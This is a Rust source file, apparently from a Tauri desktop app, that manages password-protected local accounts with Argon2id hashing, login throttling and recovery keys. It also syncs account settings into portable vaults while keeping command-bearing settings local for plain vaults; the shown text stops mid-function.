//! The deck's accounts: each one a name + password, its own settings (users/<id>/)
//! and its own vault. The login screen unlocks one; that one's settings are
//! the only ones the app reads and writes until it's locked again.
//!
//! The password is never stored. `accounts.json` (in the OS config folder,
//! readable by your user only) holds each account's name and an Argon2id hash
//! (64 MiB, 3 passes, like the vault key) with a random salt, as a
//! standard PHC string. The hash never goes back to the UI: the UI can only
//! ask "is this the right password?", and every wrong answer makes the next
//! try wait longer (up to 8 s), so guessing is slow even for a plugin.
//!
//! An encrypted vault (vault.rs, store.rs) is opened by the same password: a
//! login hands it to the vault ([`vault::offer_password`], never stored), a lock
//! wipes the vault key from memory, a new password re-wraps the vault key.
//! A plain vault stays plain Markdown files (Obsidian-compatible).
//! Forgot the password? Quit the app and remove that account from accounts.json
//! (its settings stay in users/<id>/) — an encrypted vault then needs its
//! recovery key.

use argon2::password_hash::{rand_core::OsRng, PasswordHash, PasswordHasher, PasswordVerifier, SaltString};
use argon2::Argon2;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};
use crate::vault::{self, VaultState};
use tauri::{AppHandle, Manager, State};
use zeroize::Zeroizing;

#[derive(Serialize, Deserialize, Clone)]
struct Account {
    /// the folder name of its settings (users/<id>/): never changes, even when the name does
    #[serde(default)]
    id: String,
    user: String,
    /// PHC string: $argon2id$v=19$m=19456,t=2,p=1$<salt>$<hash>
    hash: String,
    created: u64,
    /// the same on every computer that opens this account's vault (its card says it)
    #[serde(default)]
    uid: String,
}

#[derive(Serialize, Deserialize, Default, Clone)]
struct Accounts {
    accounts: Vec<Account>,
}

/// What the UI may know about an account: its id and name (never the hash).
#[derive(Serialize, Clone)]
pub struct AccountInfo {
    id: String,
    user: String,
}

#[derive(Default)]
pub struct AccountState {
    /// the wait after wrong passwords, per account (delay.rs; quitting doesn't reset it)
    delays: Mutex<crate::delay::Delays>,
    /// the accounts' names (folded), as accounts.json last read or wrote them: a wait is kept
    /// per account only for these — every other name typed shares one (`delay_key`)
    known: Mutex<std::collections::BTreeSet<String>>,
    /// the account unlocked in this run of the app (its id): its settings are the ones read and written
    session: Mutex<Option<String>>,
    /// a plain vault brought newer settings and you haven't answered yet: this computer's
    /// aren't written over them meanwhile (`account_vault_sync`)
    hold: Mutex<bool>,
}

impl AccountState {
    /// The unlocked account's id, if any (config.rs reads the settings of that one only).
    pub fn session(&self) -> Option<String> {
        self.session.lock().ok().and_then(|s| s.clone())
    }
}

fn config_dir(app: &AppHandle) -> Result<PathBuf, String> {
    let dir = app.path().app_config_dir().map_err(|e| e.to_string())?;
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    Ok(dir)
}

/// users/<id>/: an account's own settings.json and secrets.json.
pub fn user_dir(app: &AppHandle, id: &str) -> Result<PathBuf, String> {
    if id.is_empty() || !id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
        return Err("bad account id".into());
    }
    let dir = config_dir(app)?.join("users").join(id);
    fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
    Ok(dir)
}

fn write_private(p: &Path, text: &str) -> Result<(), String> {
    crate::crypto::write_private(p, text.as_bytes()).map_err(|e| e.to_string())
}

/// Every account (accounts.json; none yet: an empty list). The single
/// account.json of before 0.4.0 is gone: update through 0.4.x first.
fn load(app: &AppHandle) -> Result<Accounts, String> {
    let dir = config_dir(app)?;
    let list_path = dir.join("accounts.json");
    match fs::read_to_string(&list_path) {
        Ok(s) => {
            let mut all: Accounts = serde_json::from_str(&s).map_err(|e| format!("accounts.json is damaged: {e}"))?;
            // accounts from before portable vaults get their uid
            if all.accounts.iter().any(|a| a.uid.is_empty()) {
                for a in all.accounts.iter_mut().filter(|a| a.uid.is_empty()) {
                    a.uid = new_uid();
                }
                save(app, &all)?;
            }
            remember_names(app, &all);
            return Ok(all);
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Accounts::default()),
        Err(e) => Err(e.to_string()),
    }
}

fn save(app: &AppHandle, all: &Accounts) -> Result<(), String> {
    let json = serde_json::to_string_pretty(all).map_err(|e| e.to_string())?;
    write_private(&config_dir(app)?.join("accounts.json"), &json)?;
    remember_names(app, all);
    Ok(())
}

/// The names the waits may be kept under (`delay_key`).
fn remember_names(app: &AppHandle, all: &Accounts) {
    if let Some(st) = app.try_state::<AccountState>() {
        *st.known.lock().unwrap() = all.accounts.iter().map(|a| norm(&a.user)).collect();
    }
}

/// Where a name's wait is counted: its own if it's an account of this deck; every other
/// name — a typo, a guess — shares one, kept under "" (no account has an empty name). So
/// `login-delay` never lists the names someone tried, and an unknown name waits like a
/// known one (nothing tells them apart).
fn delay_key(state: &AccountState, user: &str) -> String {
    let n = norm(user);
    if state.known.lock().map(|k| k.contains(&n)).unwrap_or(false) { n } else { String::new() }
}

fn norm(user: &str) -> String {
    user.trim().to_lowercase()
}

/// "Neo Anderson" → "neo-anderson" (unique among `taken`).
fn slug(user: &str, taken: &[&str]) -> String {
    let mut base: String = norm(user).chars().map(|c| if c.is_ascii_alphanumeric() { c } else { '-' }).collect();
    base = base.trim_matches('-').chars().take(32).collect();
    if base.is_empty() {
        base = "user".into();
    }
    let mut id = base.clone();
    let mut n = 2;
    while taken.contains(&id.as_str()) {
        id = format!("{base}-{n}");
        n += 1;
    }
    id
}

/// Argon2id at the vault key's cost (64 MiB, 3 passes): the hash travels in a plain
/// vault's card, so a copied folder makes every guess cost that much.
fn argon() -> Argon2<'static> {
    Argon2::new(argon2::Algorithm::Argon2id, argon2::Version::V0x13, argon2::Params::new(64 * 1024, 3, 1, None).expect("valid params"))
}

fn hash(password: &str) -> Result<String, String> {
    let salt = SaltString::generate(&mut OsRng);
    argon().hash_password(password.as_bytes(), &salt).map(|h| h.to_string()).map_err(|e| e.to_string())
}

/// A hash made with a lower cost than today's (older versions): made again at the next good login.
fn weak(phc: &str) -> bool {
    PasswordHash::new(phc).ok().and_then(|h| h.params.get_decimal("m")).is_some_and(|m| m < 64 * 1024)
}

/// The count of wrong passwords survives a restart (read once at start: `init`).
pub fn init(app: &AppHandle) {
    let st = app.state::<AccountState>();
    if let Ok(dir) = config_dir(app) {
        let _ = load(app); // the names the waits are kept under
        let known = st.known.lock().unwrap().clone();
        let mut d = crate::delay::Delays::load(&dir.join("login-delay"));
        // what an older version kept for names that aren't accounts: dropped
        d.retain(|k| k.is_empty() || known.contains(k));
        *st.delays.lock().unwrap() = d;
    }
}

/// A hash read from a file someone else may have written (a vault's card): its cost must be
/// one ICEBREAKER could have made — a forged one asking for gigabytes would freeze the app.
fn sane(phc: &str) -> bool {
    PasswordHash::new(phc).is_ok_and(|h| {
        let n = |k: &str| h.params.get_decimal(k).unwrap_or(0);
        h.algorithm.as_str() == "argon2id" && (8 * 1024..=1024 * 1024).contains(&n("m")) && (1..=16).contains(&n("t")) && (1..=8).contains(&n("p"))
    })
}

fn check(acc: &Account, user: &str, password: &str) -> bool {
    let ok_hash = PasswordHash::new(&acc.hash).map(|h| Argon2::default().verify_password(password.as_bytes(), &h).is_ok()).unwrap_or(false);
    // always run the hash (same timing for a wrong name and a wrong password)
    ok_hash && norm(&acc.user) == norm(user)
}

/// Which account a name + password open (the hash runs even for an unknown name).
fn find(all: &Accounts, user: &str, password: &str) -> Option<Account> {
    match all.accounts.iter().find(|a| norm(&a.user) == norm(user)) {
        Some(a) => check(a, user, password).then(|| a.clone()),
        None => {
            let _ = hash(password); // same time as a real check
            None
        }
    }
}

/// Wait what's left after this account's wrong passwords: 0.25 s, 0.5 s, 1 s … 8 s
/// (delay.rs). `user` = the name typed; other accounts never wait for it.
fn throttle(state: &AccountState, user: &str) {
    crate::delay::wait(&state.delays, &delay_key(state, user));
}

/// A password for `user` was right (its wait goes back to 0) or wrong (it grows).
fn record(state: &AccountState, user: &str, ok: bool) {
    if let Ok(mut d) = state.delays.lock() {
        d.record(&delay_key(state, user), ok, crate::delay::now_ms());
    }
}

/// The name of the logged-in account ("" if none): the key of its wait.
fn session_user(app: &AppHandle, state: &AccountState) -> String {
    session_account(app, state).map(|a| a.user).unwrap_or_default()
}

/// The logged-in account waits after its wrong vault passwords too (vault unlock, decrypt).
pub(crate) fn wait_session(app: &AppHandle) {
    let st = app.state::<AccountState>();
    throttle(&st, &session_user(app, &st));
}

pub(crate) fn record_session(app: &AppHandle, ok: bool) {
    let st = app.state::<AccountState>();
    record(&st, &session_user(app, &st), ok);
}

/// How long the next try for `user` will wait (ms): the login page says "wait N s".
#[tauri::command]
pub fn account_wait(state: State<AccountState>, user: String) -> u64 {
    let key = delay_key(&state, &user);
    state.delays.lock().map(|d| d.remaining(&key, crate::delay::now_ms())).unwrap_or(0)
}

fn open_session(state: &State<AccountState>, id: &str) {
    *state.session.lock().unwrap() = Some(id.to_string());
}

/// The unlocked account's name (null: locked, or no account yet).
#[tauri::command]
pub fn account_status(app: AppHandle, state: State<AccountState>) -> Result<Option<String>, String> {
    let all = load(&app)?;
    Ok(state.session().and_then(|id| all.accounts.iter().find(|a| a.id == id).map(|a| a.user.clone())))
}

/// The account unlocked in this run of the app (it survives a reload of the page).
#[tauri::command]
pub fn account_session(app: AppHandle, state: State<AccountState>) -> Result<Option<AccountInfo>, String> {
    let all = load(&app)?;
    Ok(state.session().and_then(|id| all.accounts.iter().find(|a| a.id == id).map(|a| AccountInfo { id: a.id.clone(), user: a.user.clone() })))
}

/// How many accounts there are (the login screen: 0 = make the first one). Names stay private.
#[tauri::command]
pub fn account_count(app: AppHandle) -> Result<usize, String> {
    Ok(load(&app)?.accounts.len())
}

/// A new account. The first one is free; every other one must be approved by an
/// account of this deck (its name + password): they all run as the same computer
/// user, so a new account could otherwise open a terminal on a locked deck.
/// The new account is unlocked at once (its setup runs next).
#[tauri::command(async)]
pub fn account_create(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, user: String, password: String, approver: Option<String>, approver_password: Option<String>) -> Result<AccountInfo, String> {
    let password = Zeroizing::new(password);
    let approver_password = approver_password.map(Zeroizing::new);
    let mut all = load(&app)?;
    if !all.accounts.is_empty() {
        throttle(&state, approver.as_deref().unwrap_or(""));
        let ok = find(&all, approver.as_deref().unwrap_or(""), approver_password.as_ref().map(|p| p.as_str()).unwrap_or("")).is_some();
        record(&state, approver.as_deref().unwrap_or(""), ok);
        if !ok {
            return Err("an account of this deck must approve it (its name and password)".into());
        }
    }
    validate(&user, &password)?;
    if all.accounts.iter().any(|a| norm(&a.user) == norm(&user)) {
        return Err("there's already an account with that name".into());
    }
    let taken: Vec<&str> = all.accounts.iter().map(|a| a.id.as_str()).collect();
    let id = slug(&user, &taken);
    let created = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    all.accounts.push(Account { id: id.clone(), user: user.trim().to_string(), hash: hash(&password)?, created, uid: new_uid() });
    save(&app, &all)?;
    user_dir(&app, &id)?;
    open_session(&state, &id);
    vault::offer_password(&vault, &password);
    Ok(AccountInfo { id, user: user.trim().to_string() })
}

/// Name + password of an account of this deck, checked — and nothing else: no account is
/// unlocked, no vault opened. The login screen checks who approves a new account as soon
/// as it's typed (not only when the new one is made); the setup checks the password before
/// it encrypts the vault. Throttled like a login.
#[tauri::command(async)]
pub fn account_check(app: AppHandle, state: State<AccountState>, user: String, password: String) -> Result<bool, String> {
    let password = Zeroizing::new(password);
    throttle(&state, &user);
    let all = load(&app)?;
    let ok = find(&all, &user, &password).is_some();
    record(&state, &user, ok);
    Ok(ok)
}

/// Name + password: right → that account is unlocked (its settings are the ones used).
#[tauri::command(async)]
pub fn account_verify(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, user: String, password: String) -> Result<bool, String> {
    let password = Zeroizing::new(password);
    throttle(&state, &user);
    let all = load(&app)?;
    let found = find(&all, &user, &password);
    record(&state, &user, found.is_some());
    if let Some(a) = &found {
        // a hash from an older, cheaper cost: made again now that the password is known
        if weak(&a.hash) {
            let mut all = all.clone();
            if let (Some(x), Ok(h)) = (all.accounts.iter_mut().find(|x| x.id == a.id), hash(&password)) {
                x.hash = h;
                let _ = save(&app, &all);
            }
        }
        open_session(&state, &a.id);
        // the same password opens an encrypted vault
        vault::offer_password(&vault, &password);
    }
    Ok(found.is_some())
}

/// Lock: no account is unlocked any more (the login screen comes back), and an
/// encrypted vault's key is wiped from memory.
#[tauri::command]
pub fn account_lock(state: State<AccountState>, vault: State<VaultState>) {
    *state.session.lock().unwrap() = None;
    *state.hold.lock().unwrap() = false;
    vault::lock(&vault);
}

/// Is this the logged-in account's password? (throttled like the login)
pub(crate) fn check_session(app: &AppHandle, state: &State<AccountState>, password: &str) -> Result<(), String> {
    let all = load(app)?;
    let id = state.session().ok_or("log in first: the vault is encrypted with your account's password")?;
    let acc = all.accounts.iter().find(|a| a.id == id).ok_or("no account")?;
    throttle(state, &acc.user);
    let ok = check(acc, &acc.user.clone(), password);
    record(state, &acc.user, ok);
    if ok { Ok(()) } else { Err("wrong password".into()) }
}

/// `vault encrypt`: the logged-in account's password, checked, then the vault
/// encrypted with it (vault.rs / store.rs; a backup zip is made first). The
/// report carries the recovery key's 24 words, to show once.
#[tauri::command(async)]
pub fn vault_encrypt(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, password: String, stamp: String) -> Result<crate::store::Report, String> {
    let password = Zeroizing::new(password);
    check_session(&app, &state, &password)?;
    vault::encrypt(&vault, &password, &stamp)
}

/// `vault export <folder>`: a plain copy of everything, after the account's password
/// (checked here: the interface asking isn't enough).
#[tauri::command(async)]
pub fn vault_export(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, password: String, dest: String) -> Result<crate::store::Report, String> {
    let password = Zeroizing::new(password);
    check_session(&app, &state, &password)?;
    vault::export(&app, &vault, &dest)
}

/// `vault rekey`: a new vault key (everything encrypted again, a new recovery key), after the account's password.
#[tauri::command(async)]
pub fn vault_rekey(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, password: String) -> Result<crate::store::Report, String> {
    let password = Zeroizing::new(password);
    check_session(&app, &state, &password)?;
    vault::rekey(&vault, &password)
}

/// `vault recovery`: a new recovery key (the old one stops working), after the account's password.
#[tauri::command(async)]
pub fn vault_recovery_new(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, password: String) -> Result<String, String> {
    let password = Zeroizing::new(password);
    check_session(&app, &state, &password)?;
    // proposed only: written once its words are typed back (vault_recovery_confirm)
    Ok(vault::new_recovery(&vault)?.to_string())
}

/// `vault unlock` with the recovery key: the mounted vault opens, and the
/// logged-in account's password (checked) opens it from now on.
#[tauri::command(async)]
pub fn vault_recover(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, words: String, password: String) -> Result<(), String> {
    let words = Zeroizing::new(words);
    let password = Zeroizing::new(password);
    check_session(&app, &state, &password)?;
    let path = vault::mounted(&vault).ok_or("no vault mounted")?;
    let who = session_user(&app, &state);
    throttle(&state, &who);
    let r = vault::recover(&vault, &path, &words, &password);
    record(&state, &who, r.is_ok());
    r
}

/// Login page, "forgot password": the account's name + its vault's recovery key
/// → a new password for both (the vault key re-wrapped, the account's hash
/// replaced), and the account is unlocked. Only for an encrypted vault. With
/// `path` (a vault from another computer, "open a vault"), that vault — and the
/// account is made here if it isn't (approved, like + new account).
#[tauri::command(async)]
#[allow(clippy::too_many_arguments)]
pub fn account_recover(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, user: String, words: String, new_password: String, path: Option<String>, approver: Option<String>, approver_password: Option<String>) -> Result<AccountInfo, String> {
    let words = Zeroizing::new(words);
    let new_password = Zeroizing::new(new_password);
    let approver_password = approver_password.map(Zeroizing::new);
    validate(&user, &new_password)?;
    let nope = || "that name and recovery key don't open an encrypted vault".to_string();
    if let Some(p) = path.filter(|p| !p.trim().is_empty()) {
        let p = expand(&app, &p)?;
        vault::settle(&vault, &p);
        if !crate::store::is_encrypted(&p) {
            return Err("this vault isn't encrypted: it has no recovery key (open it with its name and password)".into());
        }
        throttle(&state, &user);
        let mut st = crate::store::recover(&p, &words, &new_password).inspect_err(|_| record(&state, &user, false))?;
        record(&state, &user, true);
        let bits = vault_bits(&p, Some(&st));
        if bits.0.as_ref().is_some_and(|c| norm(&c.user) != norm(&user)) {
            return Err(nope());
        }
        let appr = approver.as_deref().map(|u| (u, approver_password.as_ref().map(|x| x.as_str()).unwrap_or("")));
        return adopt_vault(&app, &state, &vault, &p, &user, &new_password, appr, bits, |c| st.write(CARD, serde_json::to_string_pretty(c).unwrap_or_default().as_bytes()));
    }
    let mut all = load(&app)?;
    let Some(i) = all.accounts.iter().position(|a| norm(&a.user) == norm(&user)) else {
        throttle(&state, &user);
        record(&state, &user, false);
        return Err(nope());
    };
    let id = all.accounts[i].id.clone();
    // its vault: the folder its settings name
    let settings = fs::read_to_string(user_dir(&app, &id)?.join("settings.json")).unwrap_or_default();
    let path = serde_json::from_str::<serde_json::Value>(&settings)
        .ok()
        .and_then(|v| v.pointer("/vault/path").and_then(|p| p.as_str()).map(str::to_string))
        .filter(|p| !p.is_empty())
        .map(PathBuf::from)
        .ok_or_else(nope)?;
    throttle(&state, &user);
    let r = vault::recover(&vault, &path, &words, &new_password);
    // a recovery key that opens the vault is a successful login: the wait goes back to 0
    record(&state, &user, r.is_ok());
    r.map_err(|e| if e.contains("isn't encrypted") || e.contains("no recovery key") { nope() } else { e })?;
    all.accounts[i].hash = hash(&new_password)?;
    save(&app, &all).map_err(|e| format!("the vault opens with the new password, but the account couldn't be saved ({e}): use the recovery key again"))?;
    open_session(&state, &id);
    vault::offer_password(&vault, &new_password);
    Ok(AccountInfo { id, user: all.accounts[i].user.clone() })
}

/// New name and/or password for the unlocked account, after proving its current password.
#[tauri::command(async)]
pub fn account_change(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, password: String, new_user: String, new_password: String) -> Result<(), String> {
    let password = Zeroizing::new(password);
    let new_password = Zeroizing::new(new_password);
    let mut all = load(&app)?;
    let id = state.session().ok_or("locked")?;
    let i = all.accounts.iter().position(|a| a.id == id).ok_or("no account")?;
    let who = all.accounts[i].user.clone();
    throttle(&state, &who);
    let ok = check(&all.accounts[i], &who, &password);
    record(&state, &who, ok);
    if !ok {
        return Err("wrong password".into());
    }
    validate(&new_user, &new_password)?;
    if all.accounts.iter().enumerate().any(|(j, a)| j != i && norm(&a.user) == norm(&new_user)) {
        return Err("there's already an account with that name".into());
    }
    all.accounts[i].user = new_user.trim().to_string();
    all.accounts[i].hash = hash(&new_password)?;
    // an encrypted vault: its key re-wrapped by the new password first, put back if the account can't be saved
    let before = if *password != *new_password { vault::rewrap(&vault, &password, &new_password)? } else { None };
    if let Err(e) = save(&app, &all) {
        if let Some(b) = before {
            vault::rewrap_undo(&vault, &b);
        }
        return Err(e);
    }
    // the vault's card follows (another computer opens it with the new name / password)
    write_card_if_ours(&vault, &all.accounts[i]);
    Ok(())
}

/// Delete the unlocked account and its settings (its vault, a folder of notes, stays), after proving its password.
#[tauri::command(async)]
pub fn account_remove(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, password: String) -> Result<(), String> {
    let password = Zeroizing::new(password);
    let mut all = load(&app)?;
    let id = state.session().ok_or("locked")?;
    let i = all.accounts.iter().position(|a| a.id == id).ok_or("no account")?;
    let who = all.accounts[i].user.clone();
    throttle(&state, &who);
    let ok = check(&all.accounts[i], &who, &password);
    record(&state, &who, ok);
    if !ok {
        return Err("wrong password".into());
    }
    all.accounts.remove(i);
    save(&app, &all)?;
    let _ = fs::remove_dir_all(config_dir(&app)?.join("users").join(&id));
    *state.session.lock().unwrap() = None;
    vault::lock(&vault);
    Ok(())
}

fn validate(user: &str, password: &str) -> Result<(), String> {
    if user.trim().is_empty() || user.trim().chars().count() > 64 {
        return Err("the account name must be 1–64 characters".into());
    }
    if password.chars().count() < 8 {
        return Err("the password must be at least 8 characters".into());
    }
    if password.len() > 1024 {
        return Err("that password is too long".into());
    }
    Ok(())
}

// ── portable vaults: the account and its settings travel with the vault ─────
//
// The vault holds a card (.icebreaker/account.json: the account's uid, name and
// password hash) and a copy of its settings (.icebreaker/settings.json, without the
// vault's own path; secrets.json too, only inside an encrypted vault). On another
// computer, "open a vault" on the login page reads them: name + password open it
// (an encrypted vault: its key file proves the password), the account is made
// there, the settings come with it. The vault is the reference: when its copy of
// the settings is newer (changed on another computer), it replaces this one's.

const CARD: &str = ".icebreaker/account.json";
const VAULT_SETTINGS: &str = ".icebreaker/settings.json";
const VAULT_SECRETS: &str = ".icebreaker/secrets.json";

fn new_uid() -> String {
    let mut b = [0u8; 16];
    let _ = getrandom::getrandom(&mut b);
    b.iter().map(|x| format!("{x:02x}")).collect()
}

fn now_ms() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_millis() as u64).unwrap_or(0)
}

#[derive(Serialize, Deserialize, Clone)]
struct Card {
    #[serde(default)]
    format: String,
    #[serde(default)]
    version: u32,
    uid: String,
    user: String,
    /// the account's Argon2id hash (a plain vault is opened with it elsewhere)
    hash: String,
    #[serde(default)]
    saved: u64,
}

impl Card {
    fn of(a: &Account) -> Card {
        Card { format: "ICEBREAKER account".into(), version: 1, uid: a.uid.clone(), user: a.user.clone(), hash: a.hash.clone(), saved: now_ms() }
    }
}

fn read_card(vault: &VaultState) -> Option<Card> {
    serde_json::from_slice(&vault::read_file(vault, CARD)?).ok()
}

/// The mounted vault's card, written if the vault is this account's (or has none yet).
fn write_card_if_ours(vault: &VaultState, a: &Account) {
    match read_card(vault) {
        Some(c) if c.uid != a.uid => {}
        _ => {
            let _ = vault::write_file(vault, CARD, serde_json::to_string_pretty(&Card::of(a)).unwrap_or_default().as_bytes());
        }
    }
}

fn session_account(app: &AppHandle, state: &AccountState) -> Option<Account> {
    let id = state.session()?;
    load(app).ok()?.accounts.into_iter().find(|a| a.id == id)
}

/// The settings' "_saved" time (ms), 0 if none.
fn saved_of(v: &serde_json::Value) -> u64 {
    v.get("_saved").and_then(|x| x.as_u64()).unwrap_or(0)
}

/// A settings file as the vault keeps it: the same, without where the vault is on this computer.
fn portable_settings(v: &serde_json::Value) -> serde_json::Value {
    let mut v = v.clone();
    if let Some(vault) = v.get_mut("vault").and_then(|x| x.as_object_mut()) {
        vault.remove("path");
    }
    v
}

/// The settings that hold commands or decide what runs, what leaves the computer and where
/// things are: keys and THE MENU, macros and the shell, pins, the module list, the AI, privacy,
/// updates. A **plain** vault never brings them: anyone who can write in its folder (a sync, a
/// shared USB key, another program) would otherwise plant a command behind one of your keys.
/// An encrypted vault brings everything: only its password writes in it.
/// (voice: its name is handed to the OS speech engine — Fable pass 24/11)
const LOCAL_ONLY: &[&str] = &["keys", "keyOverrides", "menu", "shell", "plugins", "favorites", "gamepad", "ai", "privacy", "updates", "vault", "moduleSettings", "session", "setup", "voice"];

/// A plain vault's settings as this computer may take them: theirs, with the LOCAL_ONLY
/// sections (and HOME's shortcut squares) kept from here.
fn plain_safe(theirs: &serde_json::Value, local: &serde_json::Value) -> serde_json::Value {
    let mut t = theirs.clone();
    let Some(o) = t.as_object_mut() else { return local.clone() };
    for k in LOCAL_ONLY {
        match local.get(*k) {
            Some(v) => {
                o.insert((*k).to_string(), v.clone());
            }
            None => {
                o.remove(*k);
            }
        }
    }
    if let Some(home) = o.get_mut("home").and_then(|h| h.as_object_mut()) {
        match local.pointer("/home/links") {
            Some(v) => {
                home.insert("links".into(), v.clone());
            }
            None => {
                home.remove("links");
            }
        }
    }
    t
}

/// config.rs, after writing the account's settings.json / secrets.json: the same
/// goes into its vault (secrets only into an encrypted one). Returns the text to
/// keep locally (settings get their "_saved" time).
pub fn mirror_to_vault(app: &AppHandle, state: &AccountState, vault: &VaultState, name: &str, content: &str) -> String {
    let Some(a) = session_account(app, state) else { return content.to_string() };
    let ours = match read_card(vault) {
        Some(c) => c.uid == a.uid,
        None => vault::mounted(vault).is_some(),
    };
    if name == "settings.json" {
        let Ok(mut v) = serde_json::from_str::<serde_json::Value>(content) else { return content.to_string() };
        if let Some(o) = v.as_object_mut() {
            o.insert("_saved".into(), serde_json::json!(now_ms()));
        }
        let text = serde_json::to_string_pretty(&v).unwrap_or_else(|_| content.to_string());
        // newer settings wait in the vault for your answer: not written over meanwhile
        let hold = state.hold.lock().map(|h| *h).unwrap_or(false);
        if ours && !hold {
            write_card_if_ours(vault, &a);
            let _ = vault::write_file(vault, VAULT_SETTINGS, serde_json::to_string_pretty(&portable_settings(&v)).unwrap_or_default().as_bytes());
        }
        return text;
    }
    if name == "secrets.json" && ours && vault::is_encrypted(vault) {
        let _ = vault::write_file(vault, VAULT_SECRETS, content.as_bytes());
    }
    content.to_string()
}

/// After mounting the vault: if it's this account's and its settings are newer (changed on
/// another computer), they replace this computer's (keeping where the vault is here).
/// Returns "taken" (the deck reloads them), "ask" or "none".
///
/// - An **encrypted** vault: taken at once, a new name or password too — only its password
///   writes in it.
/// - A **plain** vault is a folder anyone with access can write in: nothing is taken without
///   your yes ("ask" → call again with `accept`), never the password or the name, never the
///   settings that hold commands ([`LOCAL_ONLY`]). While you haven't answered, this
///   computer's settings aren't written over the vault's.
///
/// Otherwise the vault gets this computer's card and settings. Another account's vault is
/// left as it is.
#[tauri::command]
pub fn account_vault_sync(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, accept: Option<bool>) -> Result<String, String> {
    let none = || Ok("none".to_string());
    let Some(a) = session_account(&app, &state) else { return none() };
    if !vault::accessible(&vault) {
        return none();
    }
    let card = read_card(&vault);
    if card.as_ref().is_some_and(|c| c.uid != a.uid) {
        return none();
    }
    let encrypted = vault::is_encrypted(&vault);
    let dir = user_dir(&app, &a.id)?;
    let local: serde_json::Value = fs::read_to_string(dir.join("settings.json")).ok().and_then(|s| serde_json::from_str(&s).ok()).unwrap_or(serde_json::json!({}));
    let theirs: Option<serde_json::Value> = vault::read_file(&vault, VAULT_SETTINGS).and_then(|b| serde_json::from_slice(&b).ok());
    let held = std::mem::replace(&mut *state.hold.lock().map_err(|e| e.to_string())?, false);
    if let (Some(c), Some(t)) = (&card, &theirs) {
        let newer = saved_of(t) > saved_of(&local);
        let take = if encrypted {
            newer
        } else if newer || held {
            match accept {
                None => {
                    *state.hold.lock().map_err(|e| e.to_string())? = true;
                    return Ok("ask".into());
                }
                Some(yes) => yes,
            }
        } else {
            false
        };
        if take {
            // changed elsewhere: the vault's settings win (a plain vault's: the safe part only)
            let mut t_new = if encrypted { t.clone() } else { plain_safe(t, &local) };
            // never older than the vault's own: a clock ahead on the other computer (or a date
            // written by hand) would otherwise look "newer" again at every start
            let stamp = now_ms().max(saved_of(t));
            let t = &mut t_new;
            if let Some(o) = t.as_object_mut() {
                o.insert("_saved".into(), serde_json::json!(stamp));
                if let Some(p) = local.pointer("/vault/path").cloned() {
                    o.entry("vault").or_insert_with(|| serde_json::json!({}));
                    if let Some(vo) = o.get_mut("vault").and_then(|x| x.as_object_mut()) {
                        vo.insert("path".into(), p);
                    }
                }
            }
            write_private(&dir.join("settings.json"), &serde_json::to_string_pretty(&t).map_err(|e| e.to_string())?)?;
            if !encrypted {
                // what this computer kept goes back into the plain vault, with this account's card:
                // the vault and the computer agree again (nothing left to ask at the next start)
                write_card_if_ours(&vault, &a);
                let _ = vault::write_file(&vault, VAULT_SETTINGS, serde_json::to_string_pretty(&portable_settings(t)).unwrap_or_default().as_bytes());
            }
            if encrypted {
                if let Some(sec) = vault::read_file(&vault, VAULT_SECRETS) {
                    write_private(&dir.join("secrets.json"), &String::from_utf8_lossy(&sec))?;
                }
                // a new name or password given on the other computer comes too — from an
                // encrypted vault only: its card can't have been written by anyone else
                let mut all = load(&app)?;
                let name_free = !all.accounts.iter().any(|x| x.id != a.id && norm(&x.user) == norm(&c.user));
                if let Some(x) = all.accounts.iter_mut().find(|x| x.id == a.id) {
                    if name_free && !c.user.trim().is_empty() && c.user.trim().chars().count() <= 64 {
                        x.user = c.user.trim().to_string();
                    }
                    if sane(&c.hash) && !weak(&c.hash) {
                        x.hash = c.hash.clone();
                    }
                }
                save(&app, &all)?;
            }
            return Ok("taken".into());
        }
    }
    // this computer's are the latest (or you said no): the vault gets them — stamped no
    // older than what it held, so they aren't "newer" again at the next start
    write_card_if_ours(&vault, &a);
    let mut mine = portable_settings(&local);
    if let (Some(o), Some(t)) = (mine.as_object_mut(), &theirs) {
        let stamp = saved_of(&local).max(saved_of(t));
        o.insert("_saved".into(), serde_json::json!(stamp));
        if stamp > saved_of(&local) {
            let mut l = local.clone();
            if let Some(lo) = l.as_object_mut() {
                lo.insert("_saved".into(), serde_json::json!(stamp));
                let _ = write_private(&dir.join("settings.json"), &serde_json::to_string_pretty(&l).unwrap_or_default());
            }
        }
    }
    let _ = vault::write_file(&vault, VAULT_SETTINGS, serde_json::to_string_pretty(&mine).unwrap_or_default().as_bytes());
    if encrypted {
        if let Ok(sec) = fs::read_to_string(dir.join("secrets.json")) {
            let _ = vault::write_file(&vault, VAULT_SECRETS, sec.as_bytes());
        }
    }
    none()
}

fn expand(app: &AppHandle, path: &str) -> Result<PathBuf, String> {
    let path = path.trim().trim_matches('"');
    let p = match path.strip_prefix('~') {
        Some(rest) => app.path().home_dir().map_err(|e| e.to_string())?.join(rest.trim_start_matches(['/', '\\'])),
        None => PathBuf::from(path),
    };
    if !p.is_absolute() {
        return Err("give the vault's full path (or ~/…)".into());
    }
    if !p.is_dir() {
        return Err(format!("{}: no such folder (is the drive plugged in?)", p.display()));
    }
    Ok(p.canonicalize().unwrap_or(p))
}

/// What a vault on the disk says about its account: its card, its settings, its
/// secrets (an encrypted one: read through `store`).
fn vault_bits(path: &Path, store: Option<&crate::store::Store>) -> (Option<Card>, Option<serde_json::Value>, Option<String>) {
    let read = |rel: &str| -> Option<Vec<u8>> {
        match store {
